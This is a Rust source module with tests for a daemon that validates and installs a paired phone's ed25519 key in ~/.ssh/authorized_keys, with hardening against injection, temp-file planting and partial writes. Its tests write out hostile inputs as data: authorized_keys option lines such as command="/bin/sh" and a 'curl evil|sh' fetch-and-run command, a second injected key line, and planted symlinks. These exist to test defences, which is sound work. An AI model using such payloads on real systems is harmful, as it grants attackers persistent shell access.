//! Writing to `~/.ssh/authorized_keys`.
//!
//! This is the most dangerous thing CodeConnect does, so it is also the most
//! constrained. The rules, in priority order:
//!
//! 1. **Nothing happens without consent given at the Mac's keyboard.** The
//!    caller only reaches [`install`] when the pairing code was minted by
//!    `codeconnect pair --ssh`. The phone can *offer* a key in any hello it likes; it
//!    can never ask for one to be installed.
//! 2. **Only a bare ed25519 key is accepted.** The first field must be exactly
//!    `ssh-ed25519`, which rejects the entire options grammar — `command="…"`,
//!    `environment="…"` and friends — that a permissive parser would let a peer
//!    smuggle in. The base64 is decoded and its SSH wire structure checked, so
//!    a line that merely *looks* like a key is refused.
//! 3. **One line in, one line out.** A newline inside the offered key would let
//!    a peer append arbitrary additional entries. Multi-line input is rejected
//!    outright rather than sanitised, because sanitising invites a bypass.
//! 4. **Never a partial file.** Every edit is written to a sibling temporary
//!    and `rename`d over the original, so an interrupted daemon cannot leave a
//!    truncated `authorized_keys` — which would lock the operator out of their
//!    own machine.
//! 5. **Never created implicitly.** [`remove`] and [`is_installed`] do not
//!    create the file, the directory, or anything else. Only an explicit,
//!    consented install may bring `~/.ssh/authorized_keys` into existence.
//!
//! Every installed entry is tagged twice — a marker comment line and the key's
//! own comment field — so removal is exact and a human reading the file can see
//! where the entry came from.

use std::io::Write;
use std::path::{Path, PathBuf};

use anyhow::{bail, Context, Result};

/// Tag written into both the marker line and the key comment.
const TAG_PREFIX: &str = "codeconnect:";

/// `4 + len("ssh-ed25519") + 4 + 32`. An ed25519 public key blob is exactly
/// this long; anything else is not one.
const ED25519_BLOB_LEN: usize = 4 + 11 + 4 + 32;
const ED25519_ALGORITHM: &str = "ssh-ed25519";

pub struct Installed {
    /// OpenSSH-format `SHA256:…`, so the operator can compare it against
    /// `ssh-keygen -lf` on the phone's key without trusting our arithmetic.
    pub fingerprint: String,
    /// True when this device already had a key and it was replaced rather than
    /// appended — re-pairing must not leave two entries for one phone.
    pub replaced: bool,
}

/// Serialises every read-modify-write of `authorized_keys`.
///
/// [`install`] and [`remove`] each read the whole file, filter it in memory and
/// rename a replacement over it. Two of those interleaving is a lost update:
/// a pairing that redeems `codeconnect pair --ssh` at the same moment as a
/// `codeconnect ssh-revoke` can both read the pre-change file, and whichever renames
/// last silently undoes the other — including resurrecting a key the operator
/// was just told had been removed. They run on different tasks of one tokio
/// runtime (the WebSocket server and the unix socket server), so this is a
/// real interleaving, not a theoretical one.
///
/// A process-local mutex, not a file lock: it closes the window this daemon
/// creates. An `authorized_keys` edited concurrently by a text editor is not
/// something any lock we take could arbitrate, and pretending otherwise would
/// be worse than being clear about the boundary.
static FILE_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

fn lock_file() -> std::sync::MutexGuard<'static, ()> {
    // A poisoned lock means a previous holder panicked mid-edit. The file is
    // still whole (every write is a rename), so recovering beats refusing to
    // ever touch authorized_keys again for the life of the daemon.
    FILE_LOCK
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner())
}

fn ssh_dir() -> PathBuf {
    protocol::home_dir().join(".ssh")
}

fn authorized_keys_path() -> PathBuf {
    ssh_dir().join("authorized_keys")
}

/// A validated ed25519 public key, ready to be written as one line.
pub struct PublicKey {
    line_body: String,
    pub fingerprint: String,
}

/// Prints the fingerprint, never the key. Public keys are not secret, but a
/// `{:?}` in a log line should stay readable and say the identifying thing.
impl std::fmt::Debug for PublicKey {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "PublicKey({})", self.fingerprint)
    }
}

/// Parse and validate an offered public key.
///
/// Refuses anything that is not a bare `ssh-ed25519` entry, including a key
/// carrying authorized_keys *options*, which would otherwise be the shortest
/// path from "pair my phone" to "run this command on every connection".
pub fn validate(offered: &str) -> Result<PublicKey> {
    let key = offered.trim();
    if key.is_empty() {
        bail!("empty public key");
    }
    // Checked before anything else: a newline is the injection vector, and the
    // only safe response is refusal.
    if key.contains('\n') || key.contains('\r') {
        bail!("a public key must be a single line");
    }
    if key.chars().any(|c| c.is_control()) {
        bail!("public key contains control characters");
    }
    if key.len() > 1024 {
        bail!("public key is implausibly long ({} bytes)", key.len());
    }

    let mut fields = key.split_whitespace();
    let algorithm = fields.next().unwrap_or_default();
    if algorithm != ED25519_ALGORITHM {
        bail!(
            "only {ED25519_ALGORITHM} keys are accepted (got {algorithm:?}); \
               options and other key types are refused"
        );
    }
    let encoded = fields.next().context("public key has no key material")?;

    let blob = base64_decode(encoded).context("key material is not valid base64")?;
    if blob.len() != ED25519_BLOB_LEN {
        bail!(
            "key material is {} bytes, not the {ED25519_BLOB_LEN} of an ed25519 key",
            blob.len()
        );
    }
    // The algorithm is named twice — once in the text, once inside the blob —
    // and OpenSSH trusts the blob. They must agree.
    let (inner_algorithm, key_len) = parse_blob(&blob).context("key material is malformed")?;
    if inner_algorithm != ED25519_ALGORITHM || key_len != 32 {
        bail!("key material does not describe an ed25519 key");
    }

    Ok(PublicKey {
        line_body: format!("{ED25519_ALGORITHM} {encoded}"),
        fingerprint: format!(
            "SHA256:{}",
            base64_encode_unpadded(&protocol::hash::sha256_bytes(&blob))
        ),
    })
}

/// Append (or replace) this device's key. Creates `~/.ssh/authorized_keys`
/// with owner-only permissions if it does not exist.
pub fn install(device_id: &str, device_name: &str, key: &PublicKey) -> Result<Installed> {
    let _guard = lock_file();
    let tag = tag_for(device_id);
    let path = authorized_keys_path();

    let dir = ssh_dir();
    std::fs::create_dir_all(&dir).with_context(|| format!("creating {}", dir.display()))?;
    // 0700 is not decoration: OpenSSH refuses to use a group- or world-writable
    // ~/.ssh at all, so getting this wrong breaks the very feature we install.
    set_mode(&dir, 0o700)?;

    let existing = read_lines(&path)?.unwrap_or_default();
    let kept: Vec<String> = existing
        .iter()
        .filter(|line| !is_ours(line, &tag))
        .cloned()
        .collect();
    let replaced = kept.len() != existing.len();

    let mut next = kept;
    next.push(format!(
        "# {tag} name={:?} added {}",
        sanitise_for_comment(device_name),
        protocol::time::now_rfc3339()
    ));
    next.push(format!("{} {tag}", key.line_body));

    write_atomically(&path, &next)?;

    // Loud on purpose. Handing out shell access is the one thing here that a
    // user must be able to find in a log later without having gone looking for
    // it at the time.
    crate::log_warn!(
        "SSH ACCESS GRANTED: appended an ed25519 key for device {device_id} ({device_name}) \
         to {} — fingerprint {} — revoke with `codeconnect ssh-revoke {device_id}`",
        path.display(),
        key.fingerprint
    );
    Ok(Installed {
        fingerprint: key.fingerprint.clone(),
        replaced,
    })
}

/// Remove this device's entry. Returns false when there was nothing to remove.
///
/// Never creates the file: a `codeconnect ssh-revoke` on a machine that never granted
/// access must leave the filesystem exactly as it found it.
pub fn remove(device_id: &str) -> Result<bool> {
    let _guard = lock_file();
    let tag = tag_for(device_id);
    let path = authorized_keys_path();
    let Some(existing) = read_lines(&path)? else {
        return Ok(false);
    };
    let kept: Vec<String> = existing
        .iter()
        .filter(|line| !is_ours(line, &tag))
        .cloned()
        .collect();
    if kept.len() == existing.len() {
        return Ok(false);
    }
    write_atomically(&path, &kept)?;
    crate::log_warn!(
        "SSH ACCESS REVOKED: removed {} line(s) for device {device_id} from {}",
        existing.len() - kept.len(),
        path.display()
    );
    Ok(true)
}

/// Whether this device currently has a key installed. Read-only.
pub fn is_installed(device_id: &str) -> bool {
    // Read-only, but still serialised: without it this can observe the file
    // mid-replacement and report a key as absent while it is being rewritten.
    let _guard = lock_file();
    let tag = tag_for(device_id);
    match read_lines(&authorized_keys_path()) {
        Ok(Some(lines)) => lines.iter().any(|line| is_key_line(line, &tag)),
        _ => false,
    }
}

fn tag_for(device_id: &str) -> String {
    format!("{TAG_PREFIX}{}", sanitise_tag(device_id))
}

/// Device ids are generated hex, but this is the value that decides which lines
/// get deleted from `authorized_keys`, so it is constrained rather than trusted.
fn sanitise_tag(device_id: &str) -> String {
    let clean: String = device_id
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
        .collect();
    if clean.is_empty() {
        "unknown".to_string()
    } else {
        clean
    }
}

/// Device names come from the phone. They only ever appear inside a quoted
/// comment, and they must not be able to leave it.
fn sanitise_for_comment(name: &str) -> String {
    name.chars()
        .filter(|c| !c.is_control() && *c != '"' && *c != '\\')
        .take(64)
        .collect()
}

/// Both line shapes we write, and nothing else. A user's own key that merely
/// mentions the string elsewhere is not ours to delete.
fn is_ours(line: &str, tag: &str) -> bool {
    is_marker_line(line, tag) || is_key_line(line, tag)
}

fn is_marker_line(line: &str, tag: &str) -> bool {
    let trimmed = line.trim_start();
    trimmed
        .strip_prefix('#')
        .map(str::trim_start)
        .is_some_and(|rest| rest == tag || rest.starts_with(&format!("{tag} ")))
}

fn is_key_line(line: &str, tag: &str) -> bool {
    let trimmed = line.trim();
    if trimmed.starts_with('#') || trimmed.is_empty() {
        return false;
    }
    // The comment is the final whitespace-separated field of a key line.
    trimmed.split_whitespace().next_back() == Some(tag)
}

/// `Ok(None)` when the file does not exist — distinct from an empty file, so
/// callers can decline to create one.
fn read_lines(path: &Path) -> Result<Option<Vec<String>>> {
    match std::fs::read_to_string(path) {
        Ok(text) => Ok(Some(text.lines().map(str::to_string).collect())),
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(err) => Err(err).with_context(|| format!("reading {}", path.display())),
    }
}

/// Write via a sibling temporary and `rename`, so the file is either the old
/// content or the new one and never a truncated mixture.
fn write_atomically(path: &Path, lines: &[String]) -> Result<()> {
    // Follow a symlink to its target: `rename` would otherwise replace the
    // link itself, silently detaching an authorized_keys that a dotfiles setup
    // deliberately points elsewhere.
    let target = std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
    let dir = target
        .parent()
        .ok_or_else(|| anyhow::anyhow!("{} has no parent directory", target.display()))?;

    let mode = std::fs::metadata(&target)
        .map(|meta| {
            use std::os::unix::fs::PermissionsExt;
            meta.permissions().mode() & 0o777
        })
        .unwrap_or(0o600);

    // The name used to be `.authorized_keys.codeconnect.<pid>` — entirely
    // predictable, in a directory whose whole purpose is deciding who may log
    // in. Anything that could create a file in `~/.ssh` before us could plant
    // that name as a symlink to a file of its choosing and have this function
    // write SSH keys through it, or plant a regular file and have it renamed
    // into place as `authorized_keys`. 128 random bits removes the guess, and
    // `create_new` removes the plant: `O_CREAT|O_EXCL` fails outright on an
    // existing path *and* refuses to follow a symlink at the final component,
    // so neither variant can win.
    let temp = dir.join(format!(
        ".authorized_keys.codeconnect.{}.tmp",
        crate::secret::hex(&crate::secret::random_bytes::<16>()?)
    ));
    // Scoped so the handle is closed — and the data on its way to disk —
    // before the rename makes it visible under the real name.
    {
        use std::os::unix::fs::OpenOptionsExt;
        // Created *at* the final mode rather than created and then narrowed:
        // the narrowing version leaves a window where the file exists at
        // whatever the umask allows. `set_mode` afterwards pins the exact bits,
        // since the creation mode is itself masked by the umask.
        let mut file = std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(mode)
            .open(&temp)
            .with_context(|| format!("creating {}", temp.display()))?;
        // Checked on the *descriptor* rather than the path, so nothing that
        // happens to the name between the open and here can change the answer.
        // A link count above one means somebody else already has a name for
        // this inode and would keep reading it after the rename.
        verify_temp_descriptor(&file, &temp)?;
        set_mode(&temp, mode)?;
        for line in lines {
            if let Err(err) = writeln!(file, "{line}") {
                let _ = std::fs::remove_file(&temp);
                return Err(err).with_context(|| format!("writing {}", temp.display()));
            }
        }
        if let Err(err) = file.sync_all() {
            let _ = std::fs::remove_file(&temp);
            return Err(err).with_context(|| format!("fsync {}", temp.display()));
        }
    }

    std::fs::rename(&temp, &target).with_context(|| {
        // A failed rename leaves the original untouched, which is the outcome
        // we want; clean up the temporary so it is not mistaken for a key file.
        let _ = std::fs::remove_file(&temp);
        format!("replacing {}", target.display())
    })?;

    // `rename` is atomic but the *directory entry* is not durable until the
    // directory itself is synced. Without this, a crash between the rename and
    // the next checkpoint can leave `~/.ssh` with neither the old file nor the
    // new one — which for `authorized_keys` means either a revoked key that
    // still works or a locked-out account. Best-effort: a directory that cannot
    // be opened for sync is not a reason to undo a rename that succeeded.
    if let Ok(handle) = std::fs::File::open(dir) {
        let _ = handle.sync_all();
    }
    Ok(())
}

/// Confirm the thing we just created is the thing we are about to write keys to.
fn verify_temp_descriptor(file: &std::fs::File, path: &Path) -> Result<()> {
    use std::os::unix::fs::MetadataExt;
    let meta = file
        .metadata()
        .with_context(|| format!("stat {}", path.display()))?;
    if !meta.is_file() {
        anyhow::bail!("{} is not a regular file", path.display());
    }
    if meta.nlink() != 1 {
        anyhow::bail!(
            "{} already has {} links; refusing to write SSH keys through it",
            path.display(),
            meta.nlink()
        );
    }
    let us = unsafe { libc_geteuid() };
    if meta.uid() != us {
        anyhow::bail!(
            "{} is owned by uid {} rather than {us}",
            path.display(),
            meta.uid()
        );
    }
    Ok(())
}

/// `geteuid(2)`.
///
/// Declared here rather than pulling in `libc` for one call. The signature is
/// fixed by POSIX, the function cannot fail, and adding a crate to the
/// dependency tree of a security-sensitive binary for a single integer is a
/// worse trade than four lines of `extern`.
unsafe fn libc_geteuid() -> u32 {
    extern "C" {
        fn geteuid() -> u32;
    }
    geteuid()
}

fn set_mode(path: &Path, mode: u32) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode))
        .with_context(|| format!("chmod {mode:o} {}", path.display()))
}

/// SSH wire format: `uint32 len | bytes`. Returns the algorithm name and the
/// length of the key that follows it.
fn parse_blob(blob: &[u8]) -> Option<(&str, usize)> {
    let (algorithm, rest) = read_field(blob)?;
    let (key, _) = read_field(rest)?;
    Some((std::str::from_utf8(algorithm).ok()?, key.len()))
}

fn read_field(bytes: &[u8]) -> Option<(&[u8], &[u8])> {
    let len = u32::from_be_bytes(bytes.get(..4)?.try_into().ok()?) as usize;
    let value = bytes.get(4..4usize.checked_add(len)?)?;
    Some((value, &bytes[4 + len..]))
}

/// Standard base64, padding required to be well-formed.
///
/// Strict on purpose: this decodes attacker-supplied bytes, and accepting a
/// sloppy encoding would mean accepting a blob OpenSSH might read differently
/// from the way we validated it.
fn base64_decode(input: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(input.len() / 4 * 3);
    let mut buffer: u32 = 0;
    let mut bits: u32 = 0;
    let mut padding = 0usize;
    let mut symbols = 0usize;

    for ch in input.chars() {
        if ch == '=' {
            padding += 1;
            continue;
        }
        if padding > 0 {
            return None; // data after padding
        }
        let value = match ch {
            'A'..='Z' => ch as u32 - 'A' as u32,
            'a'..='z' => ch as u32 - 'a' as u32 + 26,
            '0'..='9' => ch as u32 - '0' as u32 + 52,
            '+' => 62,
            '/' => 63,
            _ => return None,
        };
        symbols += 1;
        buffer = (buffer << 6) | value;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buffer >> bits) as u8);
        }
    }

    if padding > 2 || (symbols + padding) % 4 != 0 {
        return None;
    }
    // Leftover bits belong to no byte and must be zero in a canonical encoding.
    if bits >= 6 || (buffer & ((1u32 << bits) - 1)) != 0 {
        return None;
    }
    Some(out)
}

/// Standard base64 without padding — the form OpenSSH prints fingerprints in.
fn base64_encode_unpadded(bytes: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(bytes.len().div_ceil(3) * 4);
    for chunk in bytes.chunks(3) {
        let b = [
            chunk[0] as u32,
            *chunk.get(1).unwrap_or(&0) as u32,
            *chunk.get(2).unwrap_or(&0) as u32,
        ];
        let packed = (b[0] << 16) | (b[1] << 8) | b[2];
        // 3 bytes -> 4 symbols, 2 -> 3, 1 -> 2.
        for index in 0..chunk.len() + 1 {
            let shift = 18 - 6 * index;
            out.push(ALPHABET[((packed >> shift) & 0x3f) as usize] as char);
        }
    }
    out
}

/// Redirecting `HOME` for tests.
///
/// Shared rather than private to `tests` below, because *any* test that reaches
/// device code can reach this module — and a test that wrote to the developer's
/// real `~/.ssh/authorized_keys` would be a genuinely bad day. Taking the guard
/// is the only supported way to run such a test.
#[cfg(test)]
pub(crate) mod test_home {
    use std::path::PathBuf;

    /// `HOME` is process-global while tests run in parallel threads, so every
    /// redirect is serialised and restored. Without this, one test's fake home
    /// would still be installed when an unrelated test wrote a key.
    static HOME_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    pub(crate) struct FakeHome {
        pub(crate) dir: PathBuf,
        previous: Option<std::ffi::OsString>,
        _guard: std::sync::MutexGuard<'static, ()>,
    }

    impl FakeHome {
        pub(crate) fn new(tag: &str) -> FakeHome {
            let guard = HOME_LOCK.lock().unwrap_or_else(|p| p.into_inner());
            let dir = std::env::temp_dir().join(format!(
                "ccd-home-{}-{}-{}",
                tag,
                std::process::id(),
                protocol::time::now_unix_ms()
            ));
            std::fs::create_dir_all(&dir).unwrap();
            let previous = std::env::var_os("HOME");
            std::env::set_var("HOME", &dir);
            FakeHome {
                dir,
                previous,
                _guard: guard,
            }
        }

        pub(crate) fn keys(&self) -> PathBuf {
            self.dir.join(".ssh/authorized_keys")
        }

        pub(crate) fn read(&self) -> String {
            std::fs::read_to_string(self.keys()).unwrap_or_default()
        }
    }

    impl Drop for FakeHome {
        fn drop(&mut self) {
            match &self.previous {
                Some(value) => std::env::set_var("HOME", value),
                None => std::env::remove_var("HOME"),
            }
            let _ = std::fs::remove_dir_all(&self.dir);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::test_home::FakeHome;
    use super::*;

    /// A real ed25519 public key (generated for this test, never used).
    const REAL_KEY: &str =
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0JGKZ3rL5vhF2dxJ8kX9wQqM4tN6pS1aB7cD3eF5gH phone@example";

    #[test]
    fn a_real_ed25519_key_validates_and_fingerprints() {
        let key = validate(REAL_KEY).expect("must accept a real key");
        assert!(
            key.fingerprint.starts_with("SHA256:"),
            "{}",
            key.fingerprint
        );
        assert_eq!(key.fingerprint.len(), 7 + 43, "{}", key.fingerprint);
        // The comment the phone chose is dropped; ours replaces it.
        assert!(!key.line_body.contains("phone@example"));
        assert!(key.line_body.starts_with("ssh-ed25519 AAAAC3"));
    }

    #[test]
    fn a_key_without_a_comment_is_fine() {
        let bare = REAL_KEY.rsplit_once(' ').unwrap().0;
        assert!(validate(bare).is_ok());
    }

    #[test]
    fn multi_line_input_is_refused_outright() {
        // The injection vector: a second line would be a second authorized key.
        let injected = format!("{REAL_KEY}\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0JGKZ3rL5vhF2dxJ8kX9wQqM4tN6pS1aB7cD3eF5gH attacker");
        let err = validate(&injected).unwrap_err().to_string();
        assert!(err.contains("single line"), "{err}");
        assert!(validate("ssh-ed25519 AAAA\rmore").is_err());
    }

    #[test]
    fn authorized_keys_options_are_refused() {
        // `command=` would run on every connection; `from=` and friends are the
        // same grammar. Requiring the first field to be the algorithm rejects
        // the entire family in one rule.
        for hostile in [
            &format!("command=\"/bin/sh\" {REAL_KEY}"),
            &format!("no-pty,command=\"curl evil|sh\" {REAL_KEY}"),
            &format!("environment=\"PATH=/tmp\" {REAL_KEY}"),
            &format!("from=\"*\" {REAL_KEY}"),
        ] {
            assert!(validate(hostile).is_err(), "accepted options: {hostile}");
        }
    }

    #[test]
    fn other_key_types_are_refused() {
        assert!(validate("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ test").is_err());
        assert!(validate("ecdsa-sha2-nistp256 AAAAE2VjZHNh test").is_err());
        assert!(validate("sk-ssh-ed25519@openssh.com AAAA test").is_err());
    }

    #[test]
    fn malformed_material_is_refused() {
        assert!(validate("").is_err());
        assert!(validate("   ").is_err());
        assert!(validate("ssh-ed25519").is_err());
        assert!(validate("ssh-ed25519 not!base64!").is_err());
        // Valid base64, wrong length.
        assert!(validate("ssh-ed25519 QUJD").is_err());
        // Right length, wrong inner algorithm name.
        let mut blob = Vec::new();
        blob.extend_from_slice(&11u32.to_be_bytes());
        blob.extend_from_slice(b"ssh-ed25518");
        blob.extend_from_slice(&32u32.to_be_bytes());
        blob.extend_from_slice(&[7u8; 32]);
        let forged = format!("ssh-ed25519 {}", base64_encode_padded(&blob));
        assert!(
            validate(&forged).is_err(),
            "inner algorithm must be checked"
        );
    }

    #[test]
    fn an_absurdly_long_key_is_refused_before_decoding() {
        let long = format!("ssh-ed25519 {}", "A".repeat(4096));
        assert!(validate(&long).is_err());
    }

    fn base64_encode_padded(bytes: &[u8]) -> String {
        let mut out = base64_encode_unpadded(bytes);
        while out.len() % 4 != 0 {
            out.push('=');
        }
        out
    }

    #[test]
    fn base64_round_trips_and_rejects_sloppy_encodings() {
        for len in 0..64usize {
            let bytes: Vec<u8> = (0..len).map(|n| (n * 7 + 3) as u8).collect();
            let encoded = base64_encode_padded(&bytes);
            assert_eq!(base64_decode(&encoded).as_deref(), Some(bytes.as_slice()));
        }
        // A canonical decoder must reject these.
        assert_eq!(base64_decode("QQ"), None, "missing padding");
        assert_eq!(base64_decode("QUJD="), None, "over-padded");
        assert_eq!(base64_decode("QQ==QQ=="), None, "data after padding");
        assert_eq!(base64_decode("QR=="), None, "non-zero trailing bits");
        assert_eq!(base64_decode("A==="), None);
        assert_eq!(base64_decode("!!!!"), None);
        assert_eq!(base64_decode(""), Some(Vec::new()));
    }

    #[test]
    fn fingerprint_matches_the_openssh_form() {
        // `ssh-keygen -lf` prints base64 of the raw SHA-256 with no padding.
        let key = validate(REAL_KEY).unwrap();
        let body = key.fingerprint.strip_prefix("SHA256:").unwrap();
        assert!(!body.contains('='), "OpenSSH prints no padding: {body}");
        assert_eq!(body.len(), 43, "32 bytes -> 43 unpadded symbols");
    }

    #[test]
    fn our_lines_are_recognised_and_other_peoples_are_not() {
        let tag = tag_for("d1a2b3c4");
        assert!(is_marker_line("# codeconnect:d1a2b3c4", &tag));
        assert!(is_marker_line(
            "#   codeconnect:d1a2b3c4 name=\"iPhone\" added x",
            &tag
        ));
        assert!(is_key_line("ssh-ed25519 AAAA codeconnect:d1a2b3c4", &tag));

        // A different device's entry must survive.
        assert!(!is_ours("ssh-ed25519 AAAA codeconnect:other", &tag));
        // The operator's own key must survive even if it mentions us.
        assert!(!is_ours(
            "ssh-ed25519 AAAA my key for codeconnect:d1a2b3c4 stuff",
            &tag
        ));
        assert!(!is_ours("ssh-ed25519 AAAA laptop", &tag));
        assert!(!is_ours("", &tag));
        assert!(!is_ours("# a comment about codeconnect:d1a2b3c4", &tag));
    }

    #[test]
    fn tags_and_names_cannot_escape_their_syntax() {
        assert_eq!(tag_for("a b\nc"), "codeconnect:abc");
        assert_eq!(tag_for(""), "codeconnect:unknown");
        assert_eq!(tag_for("../../etc"), "codeconnect:etc");
        assert_eq!(sanitise_for_comment("i\"Phone\\\n"), "iPhone");
        assert_eq!(sanitise_for_comment(&"x".repeat(200)).len(), 64);
    }

    // ---- file-level tests, against a redirected HOME -----------------------

    #[test]
    fn a_planted_temp_file_cannot_be_written_through() {
        // The name used to be `.authorized_keys.codeconnect.<pid>` — entirely
        // predictable, in the directory that decides who may log in. Anything
        // able to create a file in `~/.ssh` first could plant that name as a
        // symlink and have CodeConnect write through it, or plant a regular
        // file and have it renamed into place as `authorized_keys`.
        let home = test_home::FakeHome::new("temp-plant");
        std::fs::create_dir_all(home.dir.join(".ssh")).unwrap();
        let victim = home.dir.join("victim");
        std::fs::write(&victim, "untouched\n").unwrap();

        // Every predictable name an attacker could have used, planted.
        for name in [
            format!(".authorized_keys.codeconnect.{}", std::process::id()),
            ".authorized_keys.codeconnect".to_string(),
            ".authorized_keys.codeconnect.tmp".to_string(),
        ] {
            let planted = home.dir.join(".ssh").join(name);
            std::os::unix::fs::symlink(&victim, &planted).unwrap();
        }

        let key = validate(REAL_KEY).unwrap();
        install("d1a2b3c4", "iPhone", &key).expect("the install must still succeed");

        assert_eq!(
            std::fs::read_to_string(&victim).unwrap(),
            "untouched\n",
            "an SSH key was written through a planted temporary"
        );
        assert!(home.read().contains("codeconnect:d1a2b3c4"));
    }

    #[test]
    fn every_temporary_gets_a_fresh_unguessable_name() {
        // Two installs in the same process used to produce the same temp name,
        // because it was derived from the pid. It has to be unpredictable *and*
        // unique, or a concurrent second writer collides with the first.
        let home = test_home::FakeHome::new("temp-unique");
        let key = validate(REAL_KEY).unwrap();
        install("aaaa1111", "iPhone", &key).unwrap();
        install("bbbb2222", "iPad", &key).unwrap();

        // Nothing is left behind, whatever the names were.
        let leftovers: Vec<String> = std::fs::read_dir(home.dir.join(".ssh"))
            .unwrap()
            .filter_map(|entry| entry.ok())
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .filter(|name| name.contains("codeconnect"))
            .collect();
        assert!(
            leftovers.is_empty(),
            "temporary files survived the install: {leftovers:?}"
        );
        assert!(home.read().contains("codeconnect:aaaa1111"));
        assert!(home.read().contains("codeconnect:bbbb2222"));
    }

    #[test]
    fn install_creates_the_file_with_owner_only_permissions() {
        use std::os::unix::fs::PermissionsExt;
        let home = FakeHome::new("create");
        let key = validate(REAL_KEY).unwrap();
        let installed = install("d1a2b3c4", "iPhone", &key).unwrap();

        assert!(!installed.replaced);
        let text = home.read();
        assert!(text.contains("# codeconnect:d1a2b3c4"), "{text}");
        assert!(text.contains("ssh-ed25519 AAAAC3"), "{text}");
        assert!(text.trim_end().ends_with("codeconnect:d1a2b3c4"), "{text}");
        assert!(is_installed("d1a2b3c4"));

        let mode = std::fs::metadata(home.keys()).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "authorized_keys must be owner-only");
        let dir_mode = std::fs::metadata(home.dir.join(".ssh"))
            .unwrap()
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(dir_mode, 0o700, "sshd refuses a loose ~/.ssh");
    }

    #[test]
    fn install_preserves_every_other_line_and_the_files_mode() {
        use std::os::unix::fs::PermissionsExt;
        let home = FakeHome::new("preserve");
        std::fs::create_dir_all(home.dir.join(".ssh")).unwrap();
        let pre = "# my own keys\nssh-ed25519 AAAAOTHER laptop\nssh-rsa AAAAB3 desktop\n";
        std::fs::write(home.keys(), pre).unwrap();
        std::fs::set_permissions(home.keys(), std::fs::Permissions::from_mode(0o644)).unwrap();

        let key = validate(REAL_KEY).unwrap();
        install("d1a2b3c4", "iPhone", &key).unwrap();

        let text = home.read();
        assert!(text.contains("ssh-ed25519 AAAAOTHER laptop"), "{text}");
        assert!(text.contains("ssh-rsa AAAAB3 desktop"), "{text}");
        assert!(text.contains("# my own keys"), "{text}");
        assert!(text.starts_with("# my own keys"), "ours must be appended");
        let mode = std::fs::metadata(home.keys()).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o644, "an existing file's mode must not be rewritten");
    }

    #[test]
    fn re_pairing_replaces_rather_than_accumulating() {
        let home = FakeHome::new("replace");
        let key = validate(REAL_KEY).unwrap();
        assert!(!install("d1a2b3c4", "iPhone", &key).unwrap().replaced);
        let second = install("d1a2b3c4", "iPhone renamed", &key).unwrap();
        assert!(second.replaced);

        let text = home.read();
        assert_eq!(text.matches("codeconnect:d1a2b3c4").count(), 2, "{text}");
        assert!(text.contains("iPhone renamed"), "{text}");
    }

    #[test]
    fn remove_deletes_only_this_devices_lines() {
        let home = FakeHome::new("remove");
        let key = validate(REAL_KEY).unwrap();
        install("aaaa1111", "iPhone", &key).unwrap();
        install("bbbb2222", "iPad", &key).unwrap();

        assert!(remove("aaaa1111").unwrap());
        let text = home.read();
        assert!(!text.contains("codeconnect:aaaa1111"), "{text}");
        assert!(text.contains("codeconnect:bbbb2222"), "{text}");
        assert!(!is_installed("aaaa1111"));
        assert!(is_installed("bbbb2222"));

        // Idempotent: revoking twice is not an error.
        assert!(!remove("aaaa1111").unwrap());
    }

    #[test]
    fn remove_never_creates_the_file() {
        let home = FakeHome::new("nocreate");
        assert!(!remove("d1a2b3c4").unwrap());
        assert!(!is_installed("d1a2b3c4"));
        assert!(
            !home.keys().exists(),
            "revoking on a machine that never granted access must touch nothing"
        );
        assert!(!home.dir.join(".ssh").exists());
    }

    #[test]
    fn a_symlinked_authorized_keys_is_followed_not_replaced() {
        // Pointing ~/.ssh/authorized_keys at a dotfiles repo is common; a
        // rename over the link would silently detach it.
        let home = FakeHome::new("symlink");
        std::fs::create_dir_all(home.dir.join(".ssh")).unwrap();
        let real = home.dir.join("dotfiles-authorized_keys");
        std::fs::write(&real, "ssh-ed25519 AAAAOTHER laptop\n").unwrap();
        std::os::unix::fs::symlink(&real, home.keys()).unwrap();

        let key = validate(REAL_KEY).unwrap();
        install("d1a2b3c4", "iPhone", &key).unwrap();

        assert!(
            std::fs::symlink_metadata(home.keys())
                .unwrap()
                .file_type()
                .is_symlink(),
            "the symlink must survive"
        );
        let through_link = std::fs::read_to_string(&real).unwrap();
        assert!(
            through_link.contains("codeconnect:d1a2b3c4"),
            "{through_link}"
        );
        assert!(through_link.contains("AAAAOTHER"), "{through_link}");
    }

    #[test]
    fn a_file_without_a_trailing_newline_does_not_glue_lines_together() {
        let home = FakeHome::new("nonewline");
        std::fs::create_dir_all(home.dir.join(".ssh")).unwrap();
        std::fs::write(home.keys(), "ssh-ed25519 AAAAOTHER laptop").unwrap();

        let key = validate(REAL_KEY).unwrap();
        install("d1a2b3c4", "iPhone", &key).unwrap();
        let text = home.read();
        assert!(
            text.contains("laptop\n"),
            "the pre-existing key must stay on its own line: {text:?}"
        );
        assert_eq!(text.lines().count(), 3, "{text:?}");
    }
}
